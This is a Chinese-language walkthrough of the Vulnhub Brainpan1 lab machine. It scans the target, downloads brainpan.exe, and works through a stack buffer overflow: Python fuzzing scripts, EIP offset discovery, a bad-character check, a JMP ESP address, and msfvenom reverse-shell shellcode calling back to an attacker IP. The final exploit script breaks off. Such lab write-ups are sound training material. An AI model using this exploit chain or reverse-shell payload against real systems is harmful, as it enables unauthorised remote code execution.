---
title: Vulnhub-Brainpan1
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Brainpan1

> [https://www.vulnhub.com/entry/brainpan-1,51/](https://www.vulnhub.com/entry/brainpan-1,51/)
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`166`
    
    ```php
    nmap -sP 192.168.75.0/24                                        
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 22:29 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00038s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.166
    Host is up (0.00043s latency).
    MAC Address: 00:0C:29:E7:37:BE (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00011s latency).
    MAC Address: 00:50:56:F8:B6:BD (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.166
    //
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 22:30 CST
    Nmap scan report for 192.168.75.166
    Host is up (0.0024s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    9999/tcp  open  abyss
    10000/tcp open  snet-sensor-mgmt
    MAC Address: 00:0C:29:E7:37:BE (VMware)
    
    ```
    
3. 扫描主机服务版本以及系统版本
    
    扫出了很奇怪的东西
    
    ```php
    nmap -sT -sV -O -p9999,10000 192.168.75.166 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 22:31 CST
    Nmap scan report for 192.168.75.166
    Host is up (0.00058s latency).
    
    PORT      STATE SERVICE VERSION
    9999/tcp  open  abyss?
    10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port9999-TCP:V=7.94SVN%I=7%D=10/24%Time=671A5A30%P=x86_64-pc-linux-gnu%
    SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
    SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
    SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
    SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
    SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
    SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
    SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
    SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
    SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
    SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
    SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
    SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
    SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
    SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
    MAC Address: 00:0C:29:E7:37:BE (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 2.6.X|3.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
    OS details: Linux 2.6.32 - 3.10
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    什么都没有
    
    ```python
    nmap -script=vuln -p9999,10000 192.168.75.166
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 22:34 CST
    Nmap scan report for 192.168.75.166
    Host is up (0.00068s latency).
    
    PORT      STATE SERVICE
    9999/tcp  open  abyss
    10000/tcp open  snet-sensor-mgmt
    ```
    

## 9999端口

1. 在浏览器访问出现了
    
    ```python
    _|                            _|                                        
    _|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
    _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
    _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
    _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                                _|                          
                                                _|
    
    [________________________ WELCOME TO BRAINPAN _________________________]
                              ENTER THE PASSWORD                              
    
                              >>                           ACCESS DENIED
    �
    ```
    
2. 使用nc连接尝试
    
    ```python
    nc 192.168.75.166 9999
    _|                            _|                                        
    _|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
    _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
    _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
    _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                                _|                          
                                                _|
    
    [________________________ WELCOME TO BRAINPAN _________________________]
                              ENTER THE PASSWORD                              
    
                              >> 0
                              ACCESS DENIED
    ```
    
    尝试输入了些东西，显示`ACCESS DENIED` ，应该是有密码之类的
    

## 10000端口

1. 浏览器访问是个页面
    
    ![image.png](image%2048.png)
    
    很简陋，index就一张照片
    
2. 扫描目录
    
    ```python
    dirsearch -u 192.168.75.166:10000 -x 403
    //
    /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
      from pkg_resources import DistributionNotFound, VersionConflict
    
      _|. _ _  _  _  _ _|_    v0.4.3                                                                                                  
     (_||| _) (/_(_|| (_| )                                                                                                           
                                                                                                                                      
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
    
    Output File: /root/Desktop/test/reports/_192.168.75.166_10000/_24-10-24_22-42-35.txt
    
    Target: http://192.168.75.166:10000/
    
    [22:42:35] Starting:                                                                                                              
    [22:42:55] 301 -    0B  - /bin  ->  /bin/                                   
    [22:42:55] 200 -  230B  - /bin/                                             
                                                                                 
    Task Completed                     
    ```
    
    仅发现一个`/bin`文件夹
    
3. 进去下载了一个 `brainpan.exe` 文件，不急着打开，先查看文件
    
    是一个32位的可执行程序
    
    ```python
    file brainpan.exe 
    //
    brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, 5 sections
    ```
    
    binwalk也没分离出什么东西
    
    ```python
    binwalk brainpan.exe
    /usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
      self.period = re.compile("\.")
    
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             Microsoft executable, portable (PE)
    
    ```
    

## brainpan.exe

1. 放到windows下执行（虚拟机）
    
    ```python
    [+] initializing winsock...done.
    [+] server socket created.
    [+] bind done on port 9999
    [+] waiting for connections.
    ```
    
    使用`socket`打开了`9999`端口，我们继续使用nc连接
    
    和之前的结果一模一样
    
2. 并且输入了字符会返回 几个字符被复制到缓冲区
    
    ```python
    [get_reply] s = [asdasdasdas
    ]
    [get_reply] copied 12 bytes to buffer
    [+] check is -1
    [get_reply] s = [asdasdasdas
    ]
    [get_reply] copied 12 bytes to buffer
    ```
    
    复制到缓冲区的过程，有没有可能存在缓冲区溢出漏洞呢
    

## 验证缓冲区溢出漏洞

1. 尝试输入足够多的字符看看是否能够溢出
    
    ```python
    import socket
    a = "A"*2000  #先给他打个2k字符过去
    s = socket.socket()
    s.connect(('192.168.75.161',9999))  // 我的windows虚拟机ip
    r = s.recv(1024)
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
    windows下的程序直接崩溃了，说明存在缓冲区溢出漏洞
    

## 定位EIP

1. windows打开 `Immunity Debugger` 连接`brainpan.exe`
    
    ![image.png](image%2049.png)
    
    主要关注右边的
    
2. 因为我们知道超过2000个字符会崩溃，但是究竟是那个字符还不知道，使用`gdb pattern`来生成2000个唯一字符来判断偏移量
    
    ```python
    gdb-peda$ pattern create 2000
    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'
    ```
    
    将字符替换刚刚的A
    
    ```python
    import socket
    a = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'
    s = socket.socket()
    s.connect(('192.168.75.161',9999))
    r = s.recv(1024)
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
3. 执行py文件，回到windows，`Immunity Debugger` 点击继续执行按钮
    
    ![image.png](image%2050.png)
    
    得到唯一字符串 `73413973` ，这是ASCII码的值
    
    **由于小端显示的原因（逆序），相当于**`s9As` ，然后通过`pattern offset`定位EIP
    
    ```python
    gdb-peda$ pattern offset s9As
    s9As found at offset: 524
    ```
    
    得到溢出溢出字符是524个，也就是只要发送524+4个字符，即可覆盖EIP寄存器，测试一下是否能覆盖EIP
    
    ```python
    import socket
    a = 'A'*524+'B'*4
    s = socket.socket()
    s.connect(('192.168.75.161',9999))
    r = s.recv(1024)
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
    ![image.png](image%2051.png)
    
    已经全被覆盖成了`42424242`也就是`B` ,确定了我们可以修改EIP
    

## 扩容ESP

那么shellcode放到哪里，准备放到ESP,我们测试一下ESP能放多少个字符

1. 修改py文件，向`ESP`发送500个c字符
    
    ```python
    import socket
    a = 'A'*524+'B'*4+'c'*500
    s = socket.socket()
    s.connect(('192.168.75.161',9999))
    r = s.recv(1024)
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
2. 可以看到ESP被覆盖为了字符c
    
    ![image.png](image%2052.png)
    
    出现`c`的首地址是`005FF910`，最后出现的地址是`005FFAE4` 
    
    那么可以存储的长度应该是`005FFAE4` -`005FF910` = `1D4` ，也就是十进制的468个字符，shellcode通常在300-400
    

## 坏字节识别

比如`%00` 在C语言中就是截断字符。坏字节即使在程序中导致程序无法正常执行的字符

坏字节字典↓，我们将它放到ESP区域看看是否有坏字节

[https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)

1. 修改py文件
    
    ```python
    import socket
    badchars = (
      "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
      "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
      "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
      "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
      "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
      "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
      "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
      "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
      "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
      "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
      "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
      "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
      "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
      "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
      "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
      "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
    a = 'A'*524+'B'*4+badchars
    s = socket.socket()
    s.connect(('192.168.75.161',9999))
    r = s.recv(1024)
    s.send(a.encode('utf-8'))
    s.close()
    ```
    
2. 发送后windows下选中ESP右键选择`fellow Dump` 查看内存情况
    
    ![image.png](image%2053.png)
    
    内存是连续就不存在坏字符，出现坏字符应该是显示00
    

## 定位jmp esp

输入shellcode可以放在ESP中，但是怎么保证能正常走到ESP，所以我们要找到`JMP ESP`的内存地址，将它覆盖到EIP处即可

`JMP ESP`的操作码是`FFE4`

1. `ImmuityDebugger` 可以方便执行py脚本，左下角输入框输入 `!mona modules`可以查看当前程序保护机制
    
    ```python
    0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
    0BADF00D    Module info :
    0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
    0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
    0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
    0BADF00D    0x76750000 | 0x7694c000 | 0x001fc000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.329 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll) 0x4140
    0BADF00D    0x77100000 | 0x7715e000 | 0x0005e000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.1 [WS2_32.DLL] (C:\Windows\System32\WS2_32.DLL) 0x4140
    0BADF00D    0x76950000 | 0x769af000 | 0x0005f000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.295 [bcryptPrimitives.dll] (C:\Windows\System32\bcryptPrimitives.dll) 0x41c0
    0BADF00D    0x77000000 | 0x770e0000 | 0x000e0000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.329 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL) 0x4140
    0BADF00D    0x761c0000 | 0x7627f000 | 0x000bf000 | True   | True    | True  | True  |  False   | True   | 7.0.18362.1 [msvcrt.dll] (C:\Windows\System32\msvcrt.dll) 0x4140
    0BADF00D    0x75090000 | 0x7509a000 | 0x0000a000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.1 [CRYPTBASE.dll] (C:\Windows\System32\CRYPTBASE.dll) 0x4540
    0BADF00D    0x750a0000 | 0x750c0000 | 0x00020000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.1 [SspiCli.dll] (C:\Windows\System32\SspiCli.dll) 0x4140
    0BADF00D    0x778d0000 | 0x77a6a000 | 0x0019a000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.329 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140
    0BADF00D    0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False |  False   | False  | -1.0- [brainpan.exe] (C:\Users\ensp\Desktop\brainpan.exe) 0x0
    0BADF00D    0x750e0000 | 0x7519b000 | 0x000bb000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.1 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll) 0x4140
    0BADF00D    0x76ec0000 | 0x76f36000 | 0x00076000 | True   | True    | True  | True  |  False   | True   | 10.0.18362.1 [sechost.dll] (C:\Windows\System32\sechost.dll) 0x4140
    0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
    ```
    
    `brainpan.exe`没有任何保护，很容易被利用，所以我们就在该文件里面寻找`JMP ESP` (其实不一定要用brainpan.exe的JMP ESP，其他未开启保护机制的程序也可以，但是其他程序现在难以定位)
    
2. 定位输入框输入 ：`!mona find -s  "\xff\xe4"  -m brainpan.exe`
    
    ```python
    Results :
    0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\ensp\Desktop\brainpan.exe), 0x0
    ```
    
    `0x311712f3`地址下存放JMP ESP指令，因为是小端显示所以需要以倒叙的插入`\xf3\x12\x17\x31`
    

## 插入shellcode

1. 使用msfvenom生成
    
    -p 为 payload -b 指定坏字符 -e 指定编码 -f 格式化输出为python语言
    
    ```python
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.75.151 LPORT=1234 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python
    //
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    x86/shikata_ga_nai chosen with final size 351
    Payload size: 351 bytes
    Final size of python file: 1745 bytes
    buf =  b""
    buf += b"\xd9\xc2\xd9\x74\x24\xf4\xba\xb3\xbf\xd6\xb2\x58"
    buf += b"\x31\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\x73"
    buf += b"\xbb\x34\x47\x8f\x2c\x3a\xa8\x6f\xad\x5b\x20\x8a"
    buf += b"\x9c\x5b\x56\xdf\x8f\x6b\x1c\x8d\x23\x07\x70\x25"
    buf += b"\xb7\x65\x5d\x4a\x70\xc3\xbb\x65\x81\x78\xff\xe4"
    buf += b"\x01\x83\x2c\xc6\x38\x4c\x21\x07\x7c\xb1\xc8\x55"
    buf += b"\xd5\xbd\x7f\x49\x52\x8b\x43\xe2\x28\x1d\xc4\x17"
    buf += b"\xf8\x1c\xe5\x86\x72\x47\x25\x29\x56\xf3\x6c\x31"
    buf += b"\xbb\x3e\x26\xca\x0f\xb4\xb9\x1a\x5e\x35\x15\x63"
    buf += b"\x6e\xc4\x67\xa4\x49\x37\x12\xdc\xa9\xca\x25\x1b"
    buf += b"\xd3\x10\xa3\xbf\x73\xd2\x13\x1b\x85\x37\xc5\xe8"
    buf += b"\x89\xfc\x81\xb6\x8d\x03\x45\xcd\xaa\x88\x68\x01"
    buf += b"\x3b\xca\x4e\x85\x67\x88\xef\x9c\xcd\x7f\x0f\xfe"
    buf += b"\xad\x20\xb5\x75\x43\x34\xc4\xd4\x0c\xf9\xe5\xe6"
    buf += b"\xcc\x95\x7e\x95\xfe\x3a\xd5\x31\xb3\xb3\xf3\xc6"
    buf += b"\xb4\xe9\x44\x58\x4b\x12\xb5\x71\x88\x46\xe5\xe9"
    buf += b"\x39\xe7\x6e\xe9\xc6\x32\x20\xb9\x68\xed\x81\x69"
    buf += b"\xc9\x5d\x6a\x63\xc6\x82\x8a\x8c\x0c\xab\x21\x77"
    buf += b"\xc7\x14\x1d\x3c\x80\xfd\x5c\xc2\xaa\x2f\xe9\x24"
    buf += b"\xd8\xdf\xbc\xff\x75\x79\xe5\x8b\xe4\x86\x33\xf6"
    buf += b"\x27\x0c\xb0\x07\xe9\xe5\xbd\x1b\x9e\x05\x88\x41"
    buf += b"\x09\x19\x26\xed\xd5\x88\xad\xed\x90\xb0\x79\xba"
    buf += b"\xf5\x07\x70\x2e\xe8\x3e\x2a\x4c\xf1\xa7\x15\xd4"
    buf += b"\x2e\x14\x9b\xd5\xa3\x20\xbf\xc5\x7d\xa8\xfb\xb1"
    buf += b"\xd1\xff\x55\x6f\x94\xa9\x17\xd9\x4e\x05\xfe\x8d"
    buf += b"\x17\x65\xc1\xcb\x17\xa0\xb7\x33\xa9\x1d\x8e\x4c"
    buf += b"\x06\xca\x06\x35\x7a\x6a\xe8\xec\x3e\x9a\xa3\xac"
    buf += b"\x17\x33\x6a\x25\x2a\x5e\x8d\x90\x69\x67\x0e\x10"
    buf += b"\x12\x9c\x0e\x51\x17\xd8\x88\x8a\x65\x71\x7d\xac"
    buf += b"\xda\x72\x54"
    
    ```
    
2. 因为我们加密呢，会生成几个桩来解码，中间需要多加几个**啥也不做的指令NOP（\x90）**，称为slide，防止“桩”被抹掉导致代码无法成功执行
    
    ```python
    import socket
    buf =  b""
    buf += b"\xd9\xc2\xd9\x74\x24\xf4\xba\xb3\xbf\xd6\xb2\x58"
    buf += b"\x31\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\x73"
